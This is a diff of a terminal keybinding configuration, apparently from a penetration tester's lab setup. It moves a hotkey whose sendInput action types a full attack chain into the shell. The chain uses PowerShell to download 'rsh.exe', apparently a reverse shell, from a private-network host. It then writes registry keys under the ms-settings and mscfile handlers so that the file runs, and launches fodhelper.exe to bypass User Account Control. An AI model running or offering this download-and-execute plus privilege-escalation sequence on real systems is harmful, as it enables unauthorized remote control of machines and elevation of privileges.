@@ -15,18 +15,18 @@
     },
     {
       "command": {
-        "action": "sendInput",
-        "input": "powershell -c 'invoke-webrequest -URI http://192.168.119.211/Windows/rsh.exe -Outfile \\users\\public\\downloads\\rsh.exe'\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nc:\\windows\\system32\\fodhelper.exe\n"      
-      },
-      "keys": "alt+shift+b"
-    },
-    {
-      "command": {
         "action": "splitPane",
         "split": "auto",
         "splitMode": "duplicate"
       },
       "keys": "alt+shift+d"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "powershell\ninvoke-webrequest -URI http://192.168.119.211/Windows/rsh.exe -Outfile \\users\\public\\downloads\\rsh.exe\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nc:\\windows\\system32\\fodhelper.exe\n"      
+      },
+      "keys": "ctrl+shift+b"
     },
     {
       "command": "find",
